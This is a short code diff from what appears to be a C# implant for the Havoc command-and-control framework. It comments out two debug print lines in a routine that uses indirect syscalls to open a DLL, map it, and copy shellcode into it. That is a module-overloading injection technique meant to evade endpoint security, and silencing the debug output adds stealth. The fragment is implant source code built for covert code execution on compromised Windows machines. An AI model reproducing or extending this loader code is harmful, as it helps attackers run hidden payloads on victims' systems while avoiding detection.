@@ -100,7 +100,7 @@ namespace HavocImplant.NativeUtils
             object[] argsNtOpenFile = new object[] { hFile, FileAccessFlags.FILE_READ_DATA | FileAccessFlags.FILE_EXECUTE | FileAccessFlags.FILE_READ_ATTRIBUTES | FileAccessFlags.SYNCHRONIZE, objectAttributes, ioStatusBlock, FileShareFlags.FILE_SHARE_READ | FileShareFlags.FILE_SHARE_DELETE, FileOpenFlags.FILE_SYNCHRONOUS_IO_NONALERT | FileOpenFlags.FILE_NON_DIRECTORY_FILE };
             var retval = ntdll.indirectSyscallInvoke<Delegates.NtOpenFile>("NtOpenFile", argsNtOpenFile);
             hFile = (IntPtr)argsNtOpenFile[0];
-            Console.WriteLine("hfile: 0x{0:X}, status code 0x{1:X}", hFile, retval);
+            //Console.WriteLine("hfile: 0x{0:X}, status code 0x{1:X}", hFile, retval);
             objectAttributes = (Structs.OBJECT_ATTRIBUTES)argsNtOpenFile[2];
             ioStatusBlock = (Structs.IO_STATUS_BLOCK)argsNtOpenFile[3];
 
@@ -124,7 +124,7 @@ namespace HavocImplant.NativeUtils
             ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, (IntPtr)size, PAGE_READWRITE, (uint)0 });
             
             //Copy shellcode into the mapped dll
-            Console.WriteLine("{1} is at 0x{0:X}", (long)pBaseAddress, dllToOverload);
+            //Console.WriteLine("{1} is at 0x{0:X}", (long)pBaseAddress, dllToOverload);
             Marshal.Copy(shellcode, 0, pBaseAddress, size);
 
             //Change back to executable
